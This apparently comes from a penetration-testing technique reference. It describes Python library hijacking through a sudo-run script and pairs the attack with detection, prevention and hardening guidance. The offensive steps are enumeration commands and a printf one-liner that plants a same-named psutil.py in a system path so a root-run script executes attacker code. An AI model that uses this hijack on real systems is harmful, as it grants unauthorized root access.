Locate the module and its writable function

notes: A file can be writable even when its parent dir is not - always check the individual module file, not just the directory. Return a dummy object matching expected attributes (.available/.total) so the script doesn't crash before you get the shell.
name: Python Library Hijacking - Sudo Script Abuse
description: A root-run Python script that imports a module you can influence lets you hijack it. Four vectors depending on what is writable / whether SETENV is allowed - overwrite the module, drop a same-named module earlier in sys.path, use PYTHONPATH, or edit the script.

variations.label: Writable module file
Writable sys.path dir
variations.command:
# place a same-named module earlier in sys.path (e.g. /usr/lib/python3.8/psutil.py):
printf '#!/usr/bin/env python3
import os
def virtual_memory():
    os.system("id")
' > /usr/lib/python3.8/psutil.py

steps.label: 1. Enumerate sudo + the target script's imports
steps.command:
sudo -l   # note the runnable script AND whether SETENV is present
cat mem_status.py   # which module + function is called (e.g. psutil.virtual_memory())

steps.label: 2. Locate the module and check writability
steps.command:
python3 -c "import psutil; print(psutil.__file__)"
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
python3 -c 'import sys; print("\n".join(sys.path))'

steps.label: 3. Hijack (pick a vector above) and run as root

defense.why_it_works: Python resolves imports by searching sys.path in order. If a directory earlier in sys.path is writable by the attacker, placing a malicious module with the same name as a legitimate one there causes Python to import the attacker's module instead. When a script is run as root via sudo, the attacker's module code executes as root. Alternatively, if the installed module file itself is writable, it can be modified directly.
defense.prerequisites: A Python script runnable via sudo. The script imports a module whose file is writable, or a directory earlier in sys.path is writable. SETENV may be needed for PYTHONPATH manipulation.
defense.impact: Arbitrary code execution as root when the sudo-privileged Python script is run. Full system compromise from a Python library writable by a low-privileged user.
defense.detection: Modification of Python module files (.py, __init__.py) by non-root. New .py files created in system Python paths. Auditd: write to /usr/local/lib/python3.x/ by non-root. SIEM: sudo python script execution shortly after module file modification.
defense.artifacts: Auditd: write to Python module file by non-root | File integrity alert (module file modified) | sudo log: python script execution by non-root
defense.prevention: Ensure all Python module files in system paths are owned by root and not writable by non-root (chmod 644 owned by root). Never allow SETENV for Python in sudoers. Audit Python sys.path for writable directories. Pin library versions and verify with checksums.
defense.misconfiguration: Python module file (e.g., /usr/local/lib/python3.8/dist-packages/psutil/__init__.py) owned by a non-root user or world-writable. sudoers allows running Python script that imports this module as root.
defense.vulnerable_config:
# Vulnerable module permissions
-rw-r--r-- 1 htb-student staff ... /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

# sudoers: allows python as root
htb-student ALL=(ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py
defense.secure_config:
# Fix module ownership and permissions
chown -R root:root /usr/local/lib/python3.8/
chmod -R 644 /usr/local/lib/python3.8/dist-packages/**/*.py

# Restrict SETENV in sudoers (default)
# Never add SETENV for Python scripts in sudoers

# Use virtual environments with locked dependencies
pip install --require-hashes -r requirements.txt
